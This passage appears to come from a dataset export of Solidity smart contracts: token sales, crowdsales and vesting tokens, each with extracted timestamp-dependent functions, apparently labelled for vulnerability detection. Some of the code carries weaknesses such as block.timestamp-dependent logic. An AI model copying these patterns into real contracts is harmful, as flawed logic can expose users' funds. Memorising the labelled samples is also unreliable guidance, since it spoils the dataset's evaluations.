Vault public trustedVault;\n EthPriceFeedI public ethPriceFeed;\n event Contribution(\n address indexed contributor,\n address indexed sender,\n uint256 valueUnit,\n uint256 valueWei,\n uint256 excessWei,\n uint256 weiPerUnitRate\n );\n event EthPriceFeedChanged(address previousEthPriceFeed, address newEthPriceFeed);\n event TokensAllocated(address indexed contributor, uint256 tokenAmount);\n constructor (\n uint256 _totalSaleCapUnits,\n uint256 _minContributionUnits,\n uint256 _minThresholdUnits,\n uint256 _maxTokens,\n address _whitelistAdmin,\n address _wallet,\n uint256 _vaultInitialDisburseWei,\n uint256 _vaultDisbursementWei,\n uint256 _vaultDisbursementDuration,\n uint256 _startTime,\n string _tokenName,\n string _tokenSymbol,\n uint8 _tokenDecimals,\n EthPriceFeedI _ethPriceFeed\n )\n Whitelistable(_whitelistAdmin)\n public\n {\n require(_totalSaleCapUnits != 0);\n require(_maxTokens != 0);\n require(_wallet != 0);\n require(_minThresholdUnits <= _totalSaleCapUnits);\n require(_ethPriceFeed != address(0));\n require(now < _startTime);\n totalSaleCapUnits = _totalSaleCapUnits;\n minContributionUnits = _minContributionUnits;\n minThresholdUnits = _minThresholdUnits;\n trustedToken = new Token(\n _maxTokens,\n _tokenName,\n _tokenSymbol,\n _tokenDecimals\n );\n disbursementHandler = new DisbursementHandler(trustedToken);\n ethPriceFeed = _ethPriceFeed;\n trustedToken.setController(this);\n trustedVault = new Vault(\n _wallet,\n _vaultInitialDisburseWei,\n _vaultDisbursementWei,\n _vaultDisbursementDuration\n );\n setStates(states);\n allowFunction(SETUP, this.setup.selector);\n allowFunction(FREEZE, this.setEndTime.selector);\n allowFunction(SALE_IN_PROGRESS, this.setEndTime.selector);\n allowFunction(SALE_IN_PROGRESS, this.contribute.selector);\n allowFunction(SALE_IN_PROGRESS, this.endSale.selector);\n allowFunction(SALE_ENDED, this.allocateExtraTokens.selector);\n addStartCondition(SALE_ENDED, wasCapReached);\n setStateStartTime(SALE_IN_PROGRESS, _startTime);\n addCallback(SALE_ENDED, onSaleEnded);\n }\n function setup() external onlyOwner checkAllowed {\n trustedToken.safeTransfer(disbursementHandler, disbursementHandler.totalAmount());\n tokensForSale = trustedToken.balanceOf(this);\n require(tokensForSale >= totalSaleCapUnits);\n saleTokensPerUnit = tokensForSale.div(totalSaleCapUnits);\n goToNextState();\n }\n function changeEthPriceFeed(EthPriceFeedI _ethPriceFeed) external onlyOwner {\n require(_ethPriceFeed != address(0));\n emit EthPriceFeedChanged(ethPriceFeed, _ethPriceFeed);\n ethPriceFeed = _ethPriceFeed;\n }\n function contribute(\n address _contributor,\n uint256 _contributionLimitUnits,\n uint256 _payloadExpiration,\n bytes _sig\n )\n external\n payable\n checkAllowed\n isWhitelisted(keccak256(\n abi.encodePacked(\n _contributor,\n _contributionLimitUnits,\n _payloadExpiration\n )\n ), _sig)\n {\n require(msg.sender == _contributor);\n require(now < _payloadExpiration);\n uint256 weiPerUnitRate = ethPriceFeed.getRate();\n require(weiPerUnitRate != 0);\n uint256 previouslyContributedUnits = unitContributions[_contributor];\n uint256 currentContributionUnits = min256(\n _contributionLimitUnits.sub(previouslyContributedUnits),\n totalSaleCapUnits.sub(totalContributedUnits),\n msg.value.div(weiPerUnitRate)\n );\n require(currentContributionUnits != 0);\n require(currentContributionUnits >= minContributionUnits || previouslyContributedUnits != 0);\n unitContributions[_contributor] = previouslyContributedUnits.add(currentContributionUnits);\n totalContributedUnits = totalContributedUnits.add(currentContributionUnits);\n uint256 currentContributionWei = currentContributionUnits.mul(weiPerUnitRate);\n trustedVault.deposit.value(currentContributionWei)(msg.sender);\n if (totalContributedUnits >= minThresholdUnits &&\n trustedVault.state() != Vault.State.Success) {\n trustedVault.saleSuccessful();\n }\n uint256 excessWei = msg.value.sub(currentContributionWei);\n if (excessWei > 0) {\n msg.sender.transfer(excessWei);\n }\n emit Contribution(\n _contributor,\n msg.sender,\n currentContributionUnits,\n currentContributionWei,\n excessWei,\n weiPerUnitRate\n );\n uint256 tokenAmount = currentContributionUnits.mul(saleTokensPerUnit);\n trustedToken.safeTransfer(_contributor, tokenAmount);\n emit TokensAllocated(_contributor, tokenAmount);\n }\n function allocateExtraTokens(address _contributor)\n external\n checkAllowed\n {\n require(!extraTokensAllocated[_contributor]);\n require(unitContributions[_contributor] != 0);\n require(totalContributedUnits < totalSaleCapUnits);\n extraTokensAllocated[_contributor] = true;\n uint256 tokenAmount = unitContributions[_contributor].mul(extraTokensPerUnit);\n trustedToken.safeTransfer(_contributor, tokenAmount);\n emit TokensAllocated(_contributor, tokenAmount);\n }\n function setEndTime(uint256 _endTime) external onlyOwner checkAllowed {\n require(now < _endTime);\n require(getStateStartTime(SALE_ENDED) == 0);\n setStateStartTime(SALE_ENDED, _endTime);\n }\n function enableRefunds() external onlyOwner {\n trustedVault.enableRefunds();\n }\n function endSale() external onlyOwner checkAllowed {\n goToNextState();\n }\n function transferAllowed(address _from, address)\n external\n view\n returns (bool)\n {\n return _from == address(this) || _from == address(disbursementHandler);\n }\n function setupDisbursement(\n address _beneficiary,\n uint256 _tokenAmount,\n uint256 _duration\n )\n internal\n {\n require(tokensForSale == 0);\n disbursementHandler.setupDisbursement(\n _beneficiary,\n _tokenAmount,\n now.add(_duration)\n );\n }\n function wasCapReached(bytes32) internal returns (bool) {\n return totalSaleCapUnits <= totalContributedUnits;\n }\n function onSaleEnded() internal {\n trustedToken.transferOwnership(owner);\n if (totalContributedUnits == 0) {\n trustedToken.safeTransfer(trustedVault.trustedWallet(), tokensForSale);\n } else if (totalContributedUnits < minThresholdUnits) {\n trustedVault.enableRefunds();\n } else {\n extraTokensPerUnit = tokensForSale.div(totalContributedUnits).sub(saleTokensPerUnit);\n trustedVault.close();\n trustedVault.transferOwnership(owner);\n }\n }\n function min256(uint256 x, uint256 y, uint256 z) internal pure returns (uint256) {\n return Math.min256(x, Math.min256(y, z));\n }\n}\ncontract FoamSale is Sale {\n address private constant FOAM_WALLET = 0x3061CFBAe69Bff0f933353cea20de6C89Ab16acc;\n constructor()\n Sale(\n 24000000,\n 90,\n 1,\n 1000000000 * (10 ** 18),\n 0x8dAB5379f7979df2Fac963c69B66a25AcdaADbB7,\n FOAM_WALLET,\n 1 ether,\n 25000 ether,\n 0,\n 1532803878,\n \"FOAM Token\",\n \"FOAM\",\n 18,\n EthPriceFeedI(0x54bF24e1070784D7F0760095932b47CE55eb3A91)\n )\n public\n {\n setupDisbursement(FOAM_WALLET, 700000000 * (10 ** 18), 1 hours);\n }\n}",
  "extract_feature": [
    "function goToNextState() internal {\nbytes32 next = states[currentStateId].nextStateId;\nrequire(next != 0);\ncurrentStateId = next;\nfor (uint256 i = 0; i < states[next].transitionCallbacks.length; i++) {\nstates[next].transitionCallbacks[i]();\n}\nemit Transition(next, block.number);\n}",
    "function setStateStartTime(bytes32 _stateId, uint256 _timestamp) internal {\nrequire(block.timestamp < _timestamp);\nif (startTime[_stateId] == 0) {\naddStartCondition(_stateId, hasStartTimePassed);\n}\nstartTime[_stateId] = _timestamp;\nemit StateStartTimeSet(_stateId, _timestamp);\n}",
    "function hasStartTimePassed(bytes32 _stateId) internal returns(bool) {\nreturn startTime[_stateId] <= block.timestamp;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1eec"
  },
  "filename": "2797.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract OwnableToken {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function OwnableToken() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract BurnableToken is BasicToken, OwnableToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public onlyOwner {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n Burn(burner, _value);\n Transfer(burner, address(0), _value);\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract gsToken is OwnableToken, BurnableToken, StandardToken {\n string public name;\n string public symbol;\n uint8 public decimals;\n bool public paused = true;\n mapping(address => bool) public whitelist;\n modifier whenNotPaused() {\n require(!paused || whitelist[msg.sender]);\n _;\n }\n constructor(string _name,string _symbol,uint8 _decimals, address holder, address buffer) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n Transfer(address(0), holder, balances[holder] = totalSupply_ = uint256(10)**(9 + decimals));\n addToWhitelist(holder);\n addToWhitelist(buffer);\n }\n function unpause() public onlyOwner {\n paused = false;\n }\n function pause() public onlyOwner {\n paused = true;\n }\n function addToWhitelist(address addr) public onlyOwner {\n whitelist[addr] = true;\n }\n function removeFromWhitelist(address addr) public onlyOwner {\n whitelist[addr] = false;\n }\n function transfer(address to, uint256 value) public whenNotPaused returns (bool) {\n return super.transfer(to, value);\n }\n function transferFrom(address from, address to, uint256 value) public whenNotPaused returns (bool) {\n return super.transferFrom(from, to, value);\n }\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n constructor(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n constructor(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function capReached() public view returns (bool) {\n return weiRaised >= cap;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(weiRaised.add(_weiAmount) <= cap);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n constructor(uint256 _openingTime, uint256 _closingTime) public {\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhileOpen {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n}\ncontract FinalizableCrowdsale is TimedCrowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasClosed());\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n constructor(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n emit Closed();\n wallet.transfer(address(this).balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n emit RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n emit Refunded(investor, depositedValue);\n }\n}\ncontract RefundableCrowdsale is FinalizableCrowdsale {\n using SafeMath for uint256;\n uint256 public goal;\n RefundVault public vault;\n constructor(uint256 _goal) public {\n require(_goal > 0);\n vault = new RefundVault(wallet);\n goal = _goal;\n }\n function claimRefund() public {\n require(isFinalized);\n require(!goalReached());\n vault.refund(msg.sender);\n }\n function goalReached() public view returns (bool) {\n return weiRaised >= goal;\n }\n function finalization() internal {\n if (goalReached()) {\n vault.close();\n } else {\n vault.enableRefunds();\n }\n super.finalization();\n }\n function _forwardFunds() internal {\n vault.deposit.value(msg.value)(msg.sender);\n }\n}\ncontract gsCrowdsale is CappedCrowdsale, RefundableCrowdsale {\n constructor(\n uint256 _openingTime,\n uint256 _closingTime,\n uint256 _rate,\n address _wallet,\n uint256 _cap,\n ERC20 _token,\n uint256 _goal\n )\n public\n Crowdsale(_rate, _wallet, _token)\n CappedCrowdsale(_cap)\n TimedCrowdsale(_openingTime, _closingTime)\n RefundableCrowdsale(_goal)\n {\n require(_goal <= _cap);\n }\n}",
  "extract_feature": [
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1eed"
  },
  "filename": "2814.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract EthertoteToken {\n function thisContractAddress() public pure returns (address) {}\n function balanceOf(address) public pure returns (uint256) {}\n function transfer(address, uint) public {}\n}\ncontract TokenSale {\n using SafeMath for uint256;\n EthertoteToken public token;\n address public admin;\n address public thisContractAddress;\n address public tokenContractAddress = 0x42be9831FFF77972c1D0E1eC0aA9bdb3CaA04D47;\n address public tokenBurnAddress = 0xadCa18DC9489C5FE5BdDf1A8a8C2623B66029198;\n address public ethRaisedAddress = 0x9F73D808807c71Af185FEA0c1cE205002c74123C;\n uint public preIcoPhaseCountdown;\n uint public icoPhaseCountdown;\n uint public postIcoPhaseCountdown;\n bool public tokenSaleIsPaused;\n uint public tokenSalePausedTime;\n uint public tokenSaleResumedTime;\n uint public tokenSalePausedDuration;\n uint256 public weiRaised;\n uint public maxEthRaised = 9000;\n uint public maxWeiRaised = maxEthRaised.mul(1000000000000000000);\n uint public openingTime = 1535385600;\n uint public closingTime = openingTime.add(7 days);\n uint public rate = 1000000000000000;\n uint public minSpend = 100000000000000000;\n uint public maxSpend = 100000000000000000000;\n modifier onlyAdmin {\n require(msg.sender == admin\n );\n _;\n }\n event Deployed(string, uint);\n event SalePaused(string, uint);\n event SaleResumed(string, uint);\n event TokensBurned(string, uint);\n constructor() public {\n admin = msg.sender;\n thisContractAddress = address(this);\n token = EthertoteToken(tokenContractAddress);\n require(ethRaisedAddress != address(0));\n require(tokenContractAddress != address(0));\n require(tokenBurnAddress != address(0));\n preIcoPhaseCountdown = openingTime;\n icoPhaseCountdown = closingTime;\n postIcoPhaseCountdown = closingTime.add(14 days);\n emit Deployed(\"Ethertote Token Sale contract deployed\", now);\n }\n function tokenSaleTokenBalance() public view returns(uint) {\n return token.balanceOf(thisContractAddress);\n }\n function getAnyAddressTokenBalance(address _address) public view returns(uint) {\n return token.balanceOf(_address);\n }\n function tokenSaleHasFinished() public view returns (bool) {\n return now > closingTime;\n }\n function burnUnsoldTokens() public {\n require(tokenSaleIsPaused == false);\n require(tokenSaleHasFinished() == true);\n token.transfer(tokenBurnAddress, tokenSaleTokenBalance());\n emit TokensBurned(\"tokens sent to TokenBurn contract\", now);\n }\n function pauseTokenSale() onlyAdmin public {\n require(tokenSaleHasFinished() == false);\n require(tokenSaleIsPaused == false);\n tokenSaleIsPaused = true;\n tokenSalePausedTime = now;\n emit SalePaused(\"token sale has been paused\", now);\n }\n function resumeTokenSale() onlyAdmin public {\n require(tokenSaleIsPaused == true);\n tokenSaleResumedTime = now;\n tokenSalePausedDuration = tokenSaleResumedTime.sub(tokenSalePausedTime);\n closingTime = closingTime.add(tokenSalePausedDuration);\n postIcoPhaseCountdown = closingTime.add(14 days);\n tokenSaleIsPaused = false;\n emit SaleResumed(\"token sale has now resumed\", now);\n }\n event TokenPurchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount\n );\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address buyer) public payable {\n require(openingTime <= block.timestamp);\n require(block.timestamp < closingTime);\n require(msg.value >= minSpend);\n require(msg.value <= maxSpend);\n require(tokenSaleTokenBalance() > 0);\n require(tokenSaleIsPaused == false);\n uint256 weiAmount = msg.value;\n preValidatePurchase(buyer, weiAmount);\n uint256 tokens = getTokenAmount(weiAmount);\n require(tokens <= tokenSaleTokenBalance());\n weiRaised = weiRaised.add(weiAmount);\n processPurchase(buyer, tokens);\n emit TokenPurchase(\n msg.sender,\n buyer,\n weiAmount,\n tokens\n );\n updatePurchasingState(buyer, weiAmount);\n forwardFunds();\n postValidatePurchase(buyer, weiAmount);\n }\n function preValidatePurchase(\n address buyer,\n uint256 weiAmount\n )\n internal pure\n {\n require(buyer != address(0));\n require(weiAmount != 0);\n }\n function postValidatePurchase(\n address,\n uint256\n )\n internal pure\n {\n }\n function deliverTokens(\n address buyer,\n uint256 tokenAmount\n )\n internal\n {\n token.transfer(buyer, tokenAmount);\n }\n function processPurchase(\n address buyer,\n uint256 tokenAmount\n )\n internal\n {\n deliverTokens(buyer, tokenAmount);\n }\n function updatePurchasingState(\n address,\n uint256\n )\n internal pure\n {\n }\n function getTokenAmount(uint256 weiAmount)\n internal view returns (uint256)\n {\n return weiAmount.div(rate);\n }\n function forwardFunds() internal {\n ethRaisedAddress.transfer(msg.value);\n }\n function maximumRaised() public view returns(uint) {\n return maxWeiRaised;\n }\n function amountRaised() public view returns(uint) {\n return weiRaised;\n }\n function timeComplete() public view returns(uint) {\n return closingTime;\n }\n function delayOpeningTime(uint256 _openingTime) onlyAdmin public {\n openingTime = _openingTime;\n closingTime = openingTime.add(7 days);\n preIcoPhaseCountdown = openingTime;\n icoPhaseCountdown = closingTime;\n postIcoPhaseCountdown = closingTime.add(14 days);\n }\n}",
  "extract_feature": [
    "function buyTokens(address buyer) public payable {\nrequire(openingTime <= block.timestamp);\nrequire(block.timestamp < closingTime);\nrequire(msg.value >= minSpend);\nrequire(msg.value <= maxSpend);\nrequire(tokenSaleTokenBalance() > 0);\nrequire(tokenSaleIsPaused == false);\nuint256 weiAmount = msg.value;\npreValidatePurchase(buyer, weiAmount);\nuint256 tokens = getTokenAmount(weiAmount);\nrequire(tokens <= tokenSaleTokenBalance());\nweiRaised = weiRaised.add(weiAmount);\nprocessPurchase(buyer, tokens);\nemit TokenPurchase(\nmsg.sender,\nbuyer,\nweiAmount,\ntokens\n);\nupdatePurchasingState(buyer, weiAmount);\nforwardFunds();\npostValidatePurchase(buyer, weiAmount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1eee"
  },
  "filename": "2861.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract StandardToken is ERC20Basic {\n using SafeMath for uint256;\n mapping (address => mapping (address => uint256)) internal allowed;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function batchTransfer(address[] _toList, uint256[] _tokensList) public returns (bool) {\n require(_toList.length <= 100);\n require(_toList.length == _tokensList.length);\n uint256 sum = 0;\n for (uint32 index = 0; index < _tokensList.length; index++) {\n sum = sum.add(_tokensList[index]);\n }\n require (balances[msg.sender] >= sum);\n for (uint32 i = 0; i < _toList.length; i++) {\n transfer(_toList[i],_tokensList[i]);\n }\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n emit Burn(burner, _value);\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(0x0, _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract TokenVesting is StandardToken,Ownable {\n using SafeMath for uint256;\n event AddToVestMap(address vestcount);\n event DelFromVestMap(address vestcount);\n event Released(address vestcount,uint256 amount);\n event Revoked(address vestcount);\n struct tokenToVest{\n bool exist;\n uint256 start;\n uint256 cliff;\n uint256 duration;\n uint256 torelease;\n uint256 released;\n }\n mapping (address=>tokenToVest) vestToMap;\n function addToVestMap(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n uint256 _torelease\n ) public onlyOwner{\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n require(_start > block.timestamp);\n require(!vestToMap[_beneficiary].exist);\n vestToMap[_beneficiary] = tokenToVest(true,_start,_start.add(_cliff),_duration,\n _torelease,uint256(0));\n emit AddToVestMap(_beneficiary);\n }\n function delFromVestMap(\n address _beneficiary\n ) public onlyOwner{\n require(_beneficiary != address(0));\n require(vestToMap[_beneficiary].exist);\n delete vestToMap[_beneficiary];\n emit DelFromVestMap(_beneficiary);\n }\n function release(address _beneficiary) public {\n tokenToVest storage value = vestToMap[_beneficiary];\n require(value.exist);\n uint256 unreleased = releasableAmount(_beneficiary);\n require(unreleased > 0);\n require(unreleased + value.released <= value.torelease);\n vestToMap[_beneficiary].released = vestToMap[_beneficiary].released.add(unreleased);\n transfer(_beneficiary, unreleased);\n emit Released(_beneficiary,unreleased);\n }\n function releasableAmount(address _beneficiary) public view returns (uint256) {\n return vestedAmount(_beneficiary).sub(vestToMap[_beneficiary].released);\n }\n function vestedAmount(address _beneficiary) public view returns (uint256) {\n tokenToVest storage value = vestToMap[_beneficiary];\n uint256 totalBalance = value.torelease;\n if (block.timestamp < value.cliff) {\n return 0;\n } else if (block.timestamp >= value.start.add(value.duration)) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(value.start)).div(value.duration);\n }\n }\n}\ncontract PausableToken is TokenVesting, Pausable {\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value);\n }\n function batchTransfer(address[] _toList, uint256[] _tokensList) public whenNotPaused returns (bool) {\n return super.batchTransfer(_toList, _tokensList);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function release(address _beneficiary) public 